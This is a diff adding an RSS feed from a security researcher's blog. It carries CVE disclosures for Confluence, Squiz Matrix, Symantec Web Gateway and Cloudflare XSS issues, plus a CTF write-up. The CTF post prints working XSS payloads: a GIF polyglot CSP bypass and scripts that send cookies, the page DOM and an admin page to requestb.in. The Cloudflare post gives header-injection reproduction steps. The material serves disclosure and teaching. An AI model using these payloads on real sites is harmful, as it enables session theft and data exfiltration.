@@ -1,0 +1,354 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+   
+      <title>devalias.net</title>
+   
+   <link>https://www.devalias.net</link>
+   <description>Follow me into the rabbit hole that is my mind and learn about topics including.. security, technology, efficiency, biohacking, health, personal growth and probably a whole lot more.</description>
+   <language>en_GB</language>
+   <managingEditor> </managingEditor>
+   <atom:link href="rss" rel="self" type="application/rss+xml" />
+   
+	<item>
+	  <title>Atlassian Confluence: Cross-Site Scripting (XSS) (CVE-2017-16856)</title>
+	  <link>/devalias/2017/12/05/atlassian-confluence-cross-site-scripting-xss/</link>
+	  <author>devalias</author>
+	  <pubDate>2017-12-05T00:00:00+11:00</pubDate>
+	  <guid>/devalias/2017/12/05/atlassian-confluence-cross-site-scripting-xss/</guid>
+	  <description><![CDATA[
+	     <p>Earlier this year I spent some time delving into <a href="https://www.atlassian.com/software/confluence">Atlassian Confluence</a> to see if I could dig up any bugs that had slipped through the cracks. I wasn't really expecting to turn up much, but I was super excited and surprised when I managed to find an issue within the RSS feed plugin leading to Cross-Site Scripting (XSS) (Twitter: <a href="https://twitter.com/_devalias/status/922234470274498560">1</a>, <a href="https://twitter.com/_devalias/status/938271825414455298">2</a>; LinkedIn: <a href="https://www.linkedin.com/feed/update/urn:li:activity:6328008786355331072/">1</a>, <a href="https://www.linkedin.com/feed/update/urn:li:activity:6344043067401732096">2</a>; BugCrowd: <a href="https://bugcrowd.com/devalias">1</a>, <a href="https://bugcrowd.com/atlassian/hall-of-fame">2</a>).</p>
+<p>Thanks to <a href="https://www.atlassian.com/trust/security">Atlassian</a> and <a href="https://www.bugcrowd.com/">BugCrowd</a> for running an awesome bug bounty program and giving researchers the opportunity to hack things, make the internet safer, AND get rewarded while doing so!</p>
+<h2>The CVE</h2>
+<ul>
+<li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16856">CVE-2017-16856</a></strong>: The RSS Feed macro in Atlassian Confluence before version 6.5.2 allows remote attackers to inject arbitrary HTML or JavaScript via cross site scripting (XSS) vulnerabilities in various rss properties which were used as links without restriction on their scheme.
+<ul>
+<li><a href="https://jira.atlassian.com/browse/CONFSERVER-54395">Confluece Bug Report (CONFSERVER-54395)</a></li>
+<li><a href="https://confluence.atlassian.com/doc/issues-resolved-in-6-5-2-940701301.html">Confluence - Issues resolved in 6.5.2</a></li>
+<li><a href="http://www.securityfocus.com/bid/102094">SecurityFocus</a></li>
+</ul>
+</li>
+</ul>
+<h2>Remediation</h2>
+<p>This issue was fixed in Confluence <code>6.5.2</code>. Update to this version or newer to be protected. See the CVE advisory details for more information.</p>
+<h2>Chaining bugs, social engineering and platform features</h2>
+<p>As part of my PoC, I put together some fun little phishing code using the Confluence web plugin API's. If there is interest (and I'm allowed), I might share it (and some of the useful features/places to look to build similar) sometime.</p>
+<p>Once XSS is achieved, if the current user isn't already an 'elevated' administrator, the code provides error messages using standard Confluence GUI elements to convince the user to elevate their privileges with 'websudo'. Once they do that, you can basically abuse their full privileges to create new administrators, or (my favourite) install a small malicious plugin to provide Remote Code Execution (RCE) on the server.</p>
+<p>While these aren't security issues in themselves, it does show how you can leverage social engineering techniques and other platform features to chain smaller issues into something more powerful and damaging.</p>
+<h2>Acknowledgements</h2>
+<p>These issues were identified by <a href="http://devalias.net">myself</a> and the team at <a href="https://dtss.com.au">TSS</a>:</p>
+<ul>
+<li>Glenn 'devalias' Grant (<a href="http://devalias.net">http://devalias.net</a>) of TSS (<a href="https://dtss.com.au">https://dtss.com.au</a>)</li>
+</ul>
+<h2>Conclusion</h2>
+<p>It pays to look in places less travelled. If there are older features in products, or things that may not be as popular/used as often, try looking in there. Who knows what may have been overlooked.</p>
+<p>Have you ever looked into some popular software and found issues you never expected to find? Got a cool story to share about it? Maybe you've chained some bugs in an interesting way, or just want to hear more about my PoC? I'd love to hear from you in the comments below!</p>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>Squiz Matrix: Multiple vulnerabilities</title>
+	  <link>/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities/</link>
+	  <author>devalias</author>
+	  <pubDate>2017-09-07T00:00:00+10:00</pubDate>
+	  <guid>/devalias/2017/09/07/squiz-matrix-multiple-vulnerabilities/</guid>
+	  <description><![CDATA[
+	     <p>Earlier this year I had an opportunity to spend some time looking at <a href="https://www.squiz.net/technology/cms">Squiz Matrix</a>, a Content Management System (CMS) used across a number of sectors including higher eduction, media and publishing, goverment, finance, health, and utilities. With a huge number of features, a massive PHP codebase, and a numbr of high profile sectors as clients, I set out to see if I could find any interesting little bugs hidden away.</p>
+<p>While I won't get into the nitty gritty of most of the assessment process, I did find some things, and 3 CVE's were assigned (detailed below). One was interesting enough that I will probably write up the process in more detail at some point.</p>
+<p>Given the rich functionality and plugins in the Matrix product, it could be interesting to dedicate more research time to explore the areas I didn't get to cover this time around. Who knows, perhaps Squiz would even be open to setting up a Bug Bounty program through someone like <a href="https://www.bugcrowd.com/">Bugcrowd</a> in the future too. That would be cool!</p>
+<p>If you want to try it out, or play around yourself, there is a <a href="https://matrix.squiz.net/releases/vm">downloadable demo VM</a> available on the Squiz website.</p>
+<h2>The CVE's</h2>
+<ul>
+<li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14196">CVE-2017-14196</a></strong>: An information disclosure caused by a Path Traversal issue in the 'File Bridge' plugin allowed the existence of files outside of the bridged path to be confirmed.</li>
+<li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14197">CVE-2017-14197</a></strong>: Multiple reflected Cross-Site Scripting (XSS) issues in Matrix 'WYSIWYG' plugins.</li>
+<li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14198">CVE-2017-14198</a></strong>: Authenticated users with permissions to edit design assets can cause Remote Code Execution (RCE) via a maliciously crafted <code>time_format</code> tag.</li>
+</ul>
+<h2>Remediation</h2>
+<p>These issues were fixed in version <code>5.4.1.3</code>. Update to this version or newer to be protected. See the CVE advisory details for more information.</p>
+<h2>CVE-2017-14198: A Walkthrough</h2>
+<p>TODO: Write up how this was identified, and the core issue that lead to it.</p>
+<h2>Acknowledgements</h2>
+<p>These issues were identified by <a href="http://devalias.net">myself</a> and the team at <a href="https://dtss.com.au">TSS</a>:</p>
+<ul>
+<li>Glenn 'devalias' Grant (<a href="http://devalias.net">http://devalias.net</a>) of TSS (<a href="https://dtss.com.au">https://dtss.com.au</a>)</li>
+</ul>
+<p>Special thanks to Micky at Squiz for being an amazing resource throughout the disclosure process, and keeping us informed as patching and rollout progressed.</p>
+<h2>Conclusion</h2>
+<p>It seems the core issues here were a few bugs popping up in legacy code, and passing user-controlled values into sensitive areas without proper checks/sanitisation. Easy mistakes to make when managing such a large codebase that has evolved over the years.</p>
+<p>Have you had a similar experience? Manage a large codebase and legacy code? Got good tips for how best to identify and avoid these sorts of issues? Would love to hear your ideas in the comments!</p>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>CTF Snippets: XSS.gif</title>
+	  <link>/devalias/2016/09/16/ctf-snippets-xss-gif/</link>
+	  <author>devalias</author>
+	  <pubDate>2016-09-16T00:00:00+10:00</pubDate>
+	  <guid>/devalias/2016/09/16/ctf-snippets-xss-gif/</guid>
+	  <description><![CDATA[
+	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I'd do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>
+<h2>Hack the gibso.. Website</h2>
+<p>To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the <code>administrator</code> was online.. interesting.</p>
+<p>Poking around at things, I discovered that the messaging system didn't seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
+<pre lang="html"><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+</code></pre>
+<p>I checked the message.. but for some reason it didn't pop, even though my payload seemed fine in the source. :(</p>
+<pre lang="html"><code>&lt;div class=&quot;well&quot;&gt;
+  &lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;/div&gt;
+</code></pre>
+<p>Looking at the developer console gave me some more insight. Apparently this site had <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> enabled, and it was blocking my payload.</p>
+<blockquote>
+<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src 'self'&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M='), or a nonce ('nonce-...') is required to enable inline execution.</p>
+</blockquote>
+<p>Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:</p>
+<pre><code>Content-Security-Policy:
+  default-src 'none';
+  img-src 'self' placehold.it *.imgix.net;
+  script-src 'self';
+  connect-src 'self';
+  style-src 'self' fonts.gstatic.com fonts.googleapis.com;
+  font-src 'self' fonts.googleapis.com fonts.gstatic.com;
+</code></pre>
+<p>Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from <code>self</code>.</p>
+<p>How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.</p>
+<p>Using the <code>GIF89a</code> format (which conveniently starts with it's name, then the rest is the GIF payload) I constructed and uploaded my new 'avatar' <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+window.location='http://requestb.in/secretcode?c='+document.cookie;
+</code></pre>
+<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new 'avatar' by sending myself a test message:</p>
+<pre lang="html"><code>&lt;script src=&quot;http://example.com/uploads/filenamehash.gif&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:</p>
+<blockquote>
+<p>Refused to execute script from '<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>' because its MIME type ('image/gif') is not executable.</p>
+</blockquote>
+<p>This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that <code>HttpOnly</code> flag first.. Sometimes I just get caught up in the heat of the moment.</p>
+<p>Ok.. so we couldn't steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn't seem to get validated. That's good.. but what should we target?</p>
+<p>Needing some better visibility on the situation, I decided to just steal the whole <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+/* Wait for the page to fully load */
+window.onload = function() {
+  /* Create a form to send to RequestBin */
+  var f = document.createElement('form');
+  f.id=&quot;haxForm&quot;;
+  f.method=&quot;post&quot;;
+  f.action=&quot;http://requestb.in/secretcode&quot;;
+
+  /* Create a textarea to store our data */
+  var t = document.createElement('textarea');
+  t.name=&quot;haxPayload&quot;;
+
+  /* Capture the entire DOM and Base64 encode it */
+  t.value = btoa(document.documentElement.outerHTML)
+
+  /* Inject the form and send it */
+  f.appendChild(t);
+  document.body.appendChild(f);
+  document.getElementById(&quot;haxForm&quot;).submit();
+};
+</code></pre>
+<p>Ignoring my rusty JavsScript, the new payload would create a HTML <code>form</code> element with a <code>textarea</code>, grab the entire contents of the DOM, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa">Base64 encode</a> them, stick them in the <code>textarea</code>, inject the <code>form</code> into the page, then send that off to RequestBin.</p>
+<p>After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:</p>
+<pre lang="html"><code>&lt;li&gt;&lt;a href=&quot;admin.php&quot;&gt;Administration&lt;/a&gt;&lt;/li&gt;
+</code></pre>
+<p>Sweet, let's find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
+<pre lang="javascript"><code>GIF89a/*.......*/=0;
+/* Wait for the page to fully load */
+window.onload = function() {
+  /* Create a form to send to RequestBin */
+  var f = document.createElement('form');
+  f.id=&quot;haxForm&quot;;
+  f.method=&quot;post&quot;;
+  f.action=&quot;http://requestb.in/secretcode&quot;;
+
+  /* Create a textarea to store our data */
+  var t = document.createElement('textarea');
+  t.name=&quot;haxPayload&quot;;
+
+  /* Inject the form */
+  f.appendChild(t);
+  document.body.appendChild(f);
+
+  /* Load the admin page ajax-style, Base64 encode it, send it off */
+  $.get(&quot;admin.php&quot;, function(data) {
+    t.value = btoa(data);
+    document.getElementById(&quot;haxForm&quot;).submit();
+  });
+};
+</code></pre>
+<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn't even a need to do anything else:</p>
+<pre lang="html"><code>&lt;legend&gt;
+  &lt;h3&gt;Administration&lt;/h3&gt;
+&lt;/legend&gt;
+&lt;h4&gt;flag{the-secret-flag-code}&lt;/h4&gt;
+</code></pre>
+<p>Mischief managed!</p>
+<h2>Raw Notes</h2>
+<p>I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:</p>
+<ul>
+<li>Administrator is online</li>
+<li>We can send messages to users</li>
+<li>We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self</li>
+<li>We can upload image files (can we make that other types?)
+<ul>
+<li>GIF89a based XSS, won't exec in chrome though..</li>
+</ul>
+</li>
+<li>Administrator will read messages we send them (check the 'sent' page)</li>
+<li>Admin isn't using chrome! :p</li>
+<li>The request doesn't send us any cookies! :( (they're HTTP only)</li>
+<li>CSRF token doesn't seem to actually be validated.. What can we CSRF..?</li>
+<li>Use the XSS to send us the admin's DOM</li>
+<li>Seems there's an admin.php page..</li>
+<li>Ajax the admin page</li>
+<li>Success!</li>
+</ul>
+<h2>Conclusion</h2>
+<p>This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.</p>
+<p>Has this helped you learn something new? Got a better way to approach it? I'd love to hear from you in the comments!</p>
+<h2>References</h2>
+<ul>
+<li>Content Security Policy
+<ul>
+<li><a href="https://www.owasp.org/index.php/Content_Security_Policy">Content Security Policy | OWASP</a></li>
+<li><a href="https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet">Content Security Policy Cheat Sheet | OWASP</a></li>
+<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">&quot;An Introduction to Content Security Policy&quot; by HTML5 Rocks</a></li>
+<li><a href="https://content-security-policy.com/">Content Security Policy References and Examples</a></li>
+</ul>
+</li>
+<li>File Upload/Image XSS
+<ul>
+<li><a href="https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html">&quot;GIF Image XSS&quot; by eXpl0i13r</a></li>
+<li><a href="http://brutelogic.com.br/blog/file-upload-xss/">File Upload XSS | Hack2Learn</a></li>
+<li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of File Signatures | Wikipedia</a></li>
+<li><a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif">&quot;Exploiting PHP-GD imagecreatefromgif() function&quot; by d0lph1n98 </a></li>
+</ul>
+</li>
+<li>Capturing Requests
+<ul>
+<li><a href="https://requestb.in/">Request Bin</a></li>
+</ul>
+</li>
+</ul>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>Symantec Web Gateway: Cross-Site Scripting (XSS) (CVE-2013-4670)</title>
+	  <link>/devalias/2013/09/05/symantec-web-gateway-cross-site-scripting-xss/</link>
+	  <author>devalias</author>
+	  <pubDate>2013-09-05T00:00:00+10:00</pubDate>
+	  <guid>/devalias/2013/09/05/symantec-web-gateway-cross-site-scripting-xss/</guid>
+	  <description><![CDATA[
+	     <p>I found a Cross-Site Scripting (XSS) vulnerability within the Symantec Web Gateway.</p>
+<h2>The CVE</h2>
+<ul>
+<li><strong><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4670">CVE-2013-4670</a></strong>: Multiple cross-site scripting (XSS) vulnerabilities in the management console on the Symantec Web Gateway (SWG) appliance before 5.1.1 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.
+<ul>
+<li><a href="https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&amp;pvid=security_advisory&amp;year=&amp;suid=20130725_00">Security Advisories Relating to Symantec Products - Symantec Web Gateway Security Issues (SYM13-008)</a></li>
+</ul>
+</li>
+</ul>
+<h2>Acknowledgements</h2>
+<p>This issue was identified by <a href="http://devalias.net">myself</a>, as well as independently by another security researcher:</p>
+<ul>
+<li>Glenn 'devalias' Grant (<a href="http://devalias.net">http://devalias.net</a>)</li>
+</ul>
+<blockquote>
+<p>Symantec thanks Glenn 'devalias' Grant, <a href="http://devalias.net">http://devalias.net</a>, for also reporting CVE-2013-4670 and working with us as we addressed them.</p>
+</blockquote>
+
+	  ]]></description>
+	</item>
+
+	<item>
+	  <title>[DAHAX-2013-001] Cloudflare XSS Vulnerability</title>
+	  <link>/devalias/2013/08/15/dahax-2013-001-cloudflare-xss-vulnerability/</link>
+	  <author>devalias</author>
+	  <pubDate>2013-08-15T08:00:00+10:00</pubDate>
+	  <guid>/devalias/2013/08/15/dahax-2013-001-cloudflare-xss-vulnerability/</guid>
+	  <description><![CDATA[
+	     <p><strong>Reference Number:</strong> DAHAX-2013-001 (/dev/alias/hacks 2013-001)</p>
+<h3>Notification Timeline</h3>
+<ul>
+<li>10/07/2013, Request# 38713 (<a href="https://support.cloudflare.com/anonymous_requests/new">https://support.cloudflare.com/anonymous_requests/new</a>)</li>
+<li>10/07/2013, Vendor looking into issue</li>
+<li>16/07/2013, Updated vendor with new details (Length: 101 instead of 72)</li>
+<li>16/07/2013, Vendor requested that I test again</li>
+<li>No response from vendor</li>
+<li>01/08/2013, Tested again, vulnerability fixed</li>
+<li>22/08/2013, Posted details to full-disclosure</li>
+<li>22/08/2013, Vendor confirmed issue has been fixed</li>
+<li>31/08/2017, <a href="https://hackerone.com/devalias">Submitted and retroactively recognised on HackerOne</a> bug bounty program with swag</li>
+</ul>
+<p><strong>Details Published:</strong> 14/08/2013 (<a href="http://blog.devalias.net">http://blog.devalias.net</a>)</p>
+<h2>What?</h2>
+<ul>
+<li>Reflected XSS (cross site scripting) attack</li>
+</ul>
+<h2>Where's Affected?</h2>
+<ul>
+<li>Theoretically it seems that any page that uses cloudflare will be affected.
+<ul>
+<li>Eg: <a href="https://www.cloudflare.com/">http://www.cloudflare.com/</a></li>
+</ul>
+</li>
+</ul>
+<h2>How?</h2>
+<ul>
+<li><strong>To bring up the vulnerable page</strong>
+<ul>
+<li>Set your X-Forwarded-For header to 101+ characters</li>
+<li>Eg:</li>
+</ul>
+</li>
+</ul>
+<pre><code>X-Forwarded-For: AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFGGGGGGGGGGHHHHHHHHHHIIIIIIIIIIJJJJJJJJJJK
+</code></pre>
+<ul>
+<li>Load a site using cloudflare</li>
+<li>You should end up on &quot;DNS Points to Prohibited IP&quot; page
+<ul>
+<li><strong>To trigger the XSS</strong></li>
+</ul>
+</li>
+<li>Set your User-Agent string to the XSS attack
+<ul>
+<li>Eg:</li>
+</ul>
+</li>
+</ul>
+<pre><code>User-Agent: USER-AGENT being tested for XSS..&lt;script&gt;alert(''Vulnerable to XSS via USER-AGENT header [Found by devalias.net]'')&lt;/script&gt;
+</code></pre>
+<ul>
+<li><strong>The whole attack</strong>
+<ul>
+<li>Ensure your X-Forwarded-For and User-Agent headers are configured as above</li>
+<li>Navigate to a page using cloudflare</li>
+<li>???</li>
+<li>Profit!</li>
+</ul>
+</li>
+</ul>
+<h2>Who?</h2>
+<p>Discovered by <a href="http://www.devalias.net/">Glenn 'devalias' Grant</a> (<a href="mailto:glenn@devalias.net">glenn@devalias.net</a>)</p>
+<h2>Responsible Disclosure Notice</h2>
+<ul>
+<li>Following in the footsteps of Google's vulnerability disclosure timeline, unless otherwise agreed to beforehand, I reserve the right to publicly announce the details of any discovered vulnerabilities 7 days post notification.
+<ul>
+<li><strong>Google's Rationale:</strong> &quot;Seven days is an aggressive timeline and may be too short for some vendors to update their products, but it should be enough time to publish advice about possible mitigations, such as temporarily disabling a service, restricting access, or contacting the vendor for more information. As a result, after 7 days have elapsed without a patch or advisory, we will support researchers making details available so that users can take steps to protect themselves. By holding ourselves to the same standard, we hope to improve both the state of web security and the coordination of vulnerability management.&quot; - <a href="https://googleonlinesecurity.blogspot.com.au/2013/05/disclosure-timeline-for-vulnerabilities.html">Google</a></li>
+</ul>
+</li>
+</ul>
+
+	  ]]></description>
+	</item>
+
+
+</channel>
+</rss>
